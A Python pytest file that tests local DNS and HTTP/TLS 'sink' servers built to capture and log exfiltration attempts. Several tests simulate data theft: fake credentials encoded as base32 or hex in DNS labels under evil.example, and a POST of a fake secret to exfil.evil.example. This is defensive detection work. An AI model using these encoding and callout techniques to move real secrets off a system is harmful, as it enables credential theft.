"""The sink programs run as real subprocesses here; Docker integration is separate."""

import base64
import http.client
import json
import socket
import ssl
import subprocess
import sys
import time
from pathlib import Path

import pytest

SINKS = Path(__file__).resolve().parents[2] / "run" / "sinks"
SINK_ANSWER = "192.0.2.9"
SINK_TIMEOUT = 10.0


def free_port(*, udp: bool) -> int:
    kind = socket.SOCK_DGRAM if udp else socket.SOCK_STREAM
    with socket.socket(socket.AF_INET, kind) as probe:
        probe.bind(("127.0.0.1", 0))
        return probe.getsockname()[1]


def wait_for_ready(log_path: Path, sink: str, process: subprocess.Popen) -> None:
    deadline = time.monotonic() + SINK_TIMEOUT
    while time.monotonic() < deadline:
        if log_path.exists():
            for line in log_path.read_text().splitlines():
                try:
                    record = json.loads(line)
                except json.JSONDecodeError:
                    continue
                if record.get("kind") == "ready" and record.get("sink") == sink:
                    return
        time.sleep(0.05)
    if process.poll() is None:
        pytest.fail(f"{sink} sink never wrote its ready record")
    stderr = (process.stderr.read() if process.stderr else b"").decode(errors="replace")
    pytest.fail(f"{sink} sink exited {process.returncode}: {stderr.strip()[:500]}")


def stop_sink(process: subprocess.Popen) -> None:
    process.terminate()
    try:
        process.wait(timeout=5)
    except subprocess.TimeoutExpired:
        process.kill()
        process.wait(timeout=5)


def read_records(log_path: Path, kind: str) -> list[dict]:
    records = []
    for line in log_path.read_text().splitlines():
        record = json.loads(line)
        if record.get("kind") == kind:
            records.append(record)
    return records


@pytest.fixture
def dns_sink(tmp_path: Path):
    log = tmp_path / "dns.jsonl"
    port = free_port(udp=True)
    process = subprocess.Popen(
        [
            sys.executable,
            str(SINKS / "dns_sink.py"),
            "--log",
            str(log),
            "--answer",
            SINK_ANSWER,
            "--bind",
            "127.0.0.1",
            "--port",
            str(port),
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
    )
    try:
        wait_for_ready(log, "dns", process)
        yield {"log": log, "port": port}
    finally:
        stop_sink(process)


@pytest.fixture
def http_sink(tmp_path: Path):
    log = tmp_path / "http.jsonl"
    http_port = free_port(udp=False)
    tls_port = free_port(udp=False)
    process = subprocess.Popen(
        [
            sys.executable,
            str(SINKS / "http_sink.py"),
            "--log",
            str(log),
            "--bind",
            "127.0.0.1",
            "--http-port",
            str(http_port),
            "--tls-port",
            str(tls_port),
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
    )
    try:
        wait_for_ready(log, "http", process)
        yield {"log": log, "http_port": http_port, "tls_port": tls_port}
    finally:
        stop_sink(process)


def dns_query(port: int, name: str, qtype: int = 1) -> bytes:
    packet = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    for label in name.split("."):
        packet += bytes([len(label)]) + label.encode()
    packet += b"\x00" + qtype.to_bytes(2, "big") + b"\x00\x01"
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(SINK_TIMEOUT)
        sock.sendto(packet, ("127.0.0.1", port))
        response, _ = sock.recvfrom(4096)
    return response


def recv_exact(sock: socket.socket, count: int) -> bytes:
    data = bytearray()
    while len(data) < count:
        chunk = sock.recv(count - len(data))
        if not chunk:
            raise AssertionError(f"connection closed after {len(data)} of {count} bytes")
        data.extend(chunk)
    return bytes(data)


def http_request(port: int, method: str, path: str, **kwargs) -> tuple[int, bytes]:
    connection = http.client.HTTPConnection("127.0.0.1", port, timeout=SINK_TIMEOUT)
    try:
        connection.request(method, path, **kwargs)
        response = connection.getresponse()
        return response.status, response.read()
    finally:
        connection.close()


def test_dns_answers_and_decodes_label_exfil(dns_sink):
    secret = "bw-fake-credential-0123456789"
    label = base64.b32encode(secret.encode()).decode().rstrip("=")
    qname = f"{label}.evil.example"
    response = dns_query(dns_sink["port"], qname)
    assert response[:2] == b"\x12\x34"
    assert int.from_bytes(response[2:4], "big") & 0x8000  # QR set
    assert int.from_bytes(response[6:8], "big") == 1
    assert response[-4:] == socket.inet_aton(SINK_ANSWER)
    hits = read_records(dns_sink["log"], "dns")
    hit = next(record for record in hits if record["qname"] == qname)
    assert hit["source_ip"] == "127.0.0.1"
    assert hit["qtype"] == "A"
    assert any(
        entry["encoding"] == "base32" and entry["text"] == secret for entry in hit["decoded"]
    )

    hex_label = "73656e642d68656c70"
    dns_query(dns_sink["port"], f"{hex_label}.evil.example")
    hex_hit = next(
        record
        for record in read_records(dns_sink["log"], "dns")
        if record["qname"] == f"{hex_label}.evil.example"
    )
    assert any(
        entry["encoding"] == "hex" and entry["text"] == "send-help" for entry in hex_hit["decoded"]
    )


def test_dns_binary_label_does_not_decode_to_replacement_noise(dns_sink):
    label = base64.b64encode(b"\xff\xfe\xfd\xfc\xfb\xfa").decode().rstrip("=")
    dns_query(dns_sink["port"], f"{label}.evil.example")
    hit = read_records(dns_sink["log"], "dns")[-1]
    assert hit["qname"] == f"{label}.evil.example"
    assert hit["decoded"] == []


def test_dns_non_a_gets_noerror_without_answers(dns_sink):
    response = dns_query(dns_sink["port"], "plain.evil.example", qtype=28)
    assert int.from_bytes(response[6:8], "big") == 0
    hit = read_records(dns_sink["log"], "dns")[-1]
    assert hit["qname"] == "plain.evil.example"
    assert hit["qtype"] == "AAAA"
    assert hit["decoded"] == []


def test_dns_garbage_does_not_kill_the_sink(dns_sink):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.sendto(b"\xff" * 64, ("127.0.0.1", dns_sink["port"]))
        sock.sendto(b"\x12\x34", ("127.0.0.1", dns_sink["port"]))
        # A compression pointer must be refused, not parsed.
        sock.sendto(bytes.fromhex("123401000001000000000000c00c"), ("127.0.0.1", dns_sink["port"]))
    for payload in ((5).to_bytes(2, "big") + b"\x00" * 5, (4096).to_bytes(2, "big")):
        with socket.create_connection(("127.0.0.1", dns_sink["port"]), timeout=SINK_TIMEOUT) as tcp:
            tcp.sendall(payload)
    response = dns_query(dns_sink["port"], "alive.evil.example")
    assert response[-4:] == socket.inet_aton(SINK_ANSWER)
    assert any(
        record["qname"] == "alive.evil.example" for record in read_records(dns_sink["log"], "dns")
    )


def test_dns_over_tcp_query_is_answered_and_logged(dns_sink):
    name = "tcp-exfil.evil.example"
    payload = b"\x56\x78\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    payload += b"".join(bytes([len(part)]) + part.encode() for part in name.split("."))
    payload += b"\x00\x00\x01\x00\x01"
    with socket.create_connection(("127.0.0.1", dns_sink["port"]), timeout=SINK_TIMEOUT) as sock:
        sock.sendall(len(payload).to_bytes(2, "big") + payload)
        length = int.from_bytes(recv_exact(sock, 2), "big")
        response = recv_exact(sock, length)
    assert response[:2] == b"\x56\x78"
    assert int.from_bytes(response[2:4], "big") & 0x8000
    assert response[-4:] == socket.inet_aton(SINK_ANSWER)
    hit = next(record for record in read_records(dns_sink["log"], "dns") if record["qname"] == name)
    assert hit["source_ip"] == "127.0.0.1"
    assert hit["qtype"] == "A"


def test_http_logs_method_path_headers_and_body(http_sink):
    body = "bw_secret=bw-fake-staging-key-0123456789"
    status, response_body = http_request(
        http_sink["http_port"],
        "POST",
        "/collect?stage=2",
        body=body,
        headers={"Host": "exfil.evil.example", "X-Token": "bw-test-token"},
    )
    assert status == 200
    assert response_body == b"ok"
    hit = read_records(http_sink["log"], "http")[-1]
    assert hit["source_ip"] == "127.0.0.1"
    assert hit["method"] == "POST"
    assert hit["path"] == "/collect?stage=2"
    assert hit["host"] == "exfil.evil.example"
    assert hit["headers"]["x-token"] == "bw-test-token"
    assert hit["body"] == body
    assert hit["body_truncated"] is False


def test_tls_clienthello_sni_is_logged(http_sink):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    with (
        pytest.raises((ssl.SSLError, OSError)),
        socket.create_connection(("127.0.0.1", http_sink["tls_port"]), timeout=SINK_TIMEOUT) as raw,
    ):
        # The sink never answers the handshake, so it must fail.
        tls = context.wrap_socket(raw, server_hostname="exfil.evil.example")
        tls.close()
    hit = read_records(http_sink["log"], "tls")[-1]
    assert hit["source_ip"] == "127.0.0.1"
    assert hit["sni"] == "exfil.evil.example"


def test_garbage_on_all_ports_does_not_kill_the_http_sink(http_sink):
    for port in (http_sink["http_port"], http_sink["tls_port"]):
        with socket.create_connection(("127.0.0.1", port), timeout=SINK_TIMEOUT) as sock:
            sock.sendall(b"\x00\x01\x02 not-a-request\r\n\r\n")
    status, _ = http_request(http_sink["http_port"], "GET", "/after-garbage")
    assert status == 200
    assert read_records(http_sink["log"], "http")[-1]["path"] == "/after-garbage"


def test_unparseable_tcp_contact_on_the_http_port_is_a_hit(http_sink):
    with socket.create_connection(
        ("127.0.0.1", http_sink["http_port"]), timeout=SINK_TIMEOUT
    ) as sock:
        sock.sendall(b"\x00\x01\x02 binary-not-http")
        sock.shutdown(socket.SHUT_WR)
    deadline = time.monotonic() + SINK_TIMEOUT
    hits = []
    while time.monotonic() < deadline:
        hits = [
            record for record in read_records(http_sink["log"], "http") if record["method"] == ""
        ]
        if hits:
            break
        time.sleep(0.05)
    assert hits, "unparseable TCP contact was never logged"
    hit = hits[-1]
    assert hit["source_ip"] == "127.0.0.1"
    assert hit["raw"].startswith("\\x00\\x01\\x02 binary-not-http")
    assert hit["path"] == "" and hit["host"] == "" and hit["body"] == ""


def test_connection_limit_refusals_are_recorded(http_sink):
    held = [
        socket.create_connection(("127.0.0.1", http_sink["tls_port"]), timeout=SINK_TIMEOUT)
        for _ in range(16)
    ]
    try:
        time.sleep(0.3)
        for _ in range(3):
            with socket.create_connection(
                ("127.0.0.1", http_sink["tls_port"]), timeout=SINK_TIMEOUT
            ):
                pass
        deadline = time.monotonic() + SINK_TIMEOUT
        refusals = []
        while time.monotonic() < deadline:
            refusals = read_records(http_sink["log"], "refused")
            if refusals:
                break
            time.sleep(0.05)
        assert refusals, "a refused contact left no record"
        assert refusals[0]["source_ip"] == "127.0.0.1"
    finally:
        for sock in held:
            sock.close()


def test_oversize_body_is_truncated(http_sink):
    body = "x" * (64 * 1024 + 4096)
    status, _ = http_request(http_sink["http_port"], "PUT", "/flood", body=body)
    assert status == 200
    hit = read_records(http_sink["log"], "http")[-1]
    assert len(hit["body"]) == 64 * 1024
    assert hit["body_truncated"] is True


def test_log_stops_at_the_cap_but_serving_continues(http_sink):
    for _ in range(90):
        status, _ = http_request(http_sink["http_port"], "POST", "/bulk", body="y" * 64 * 1024)
        assert status == 200
    text = http_sink["log"].read_text()
    assert '"kind":"log_truncated"' in text
    http_request(http_sink["http_port"], "GET", "/post-truncation")
    assert http_sink["log"].read_text() == text  # nothing new was logged after the marker
    status, _ = http_request(http_sink["http_port"], "GET", "/still-alive")
    assert status == 200
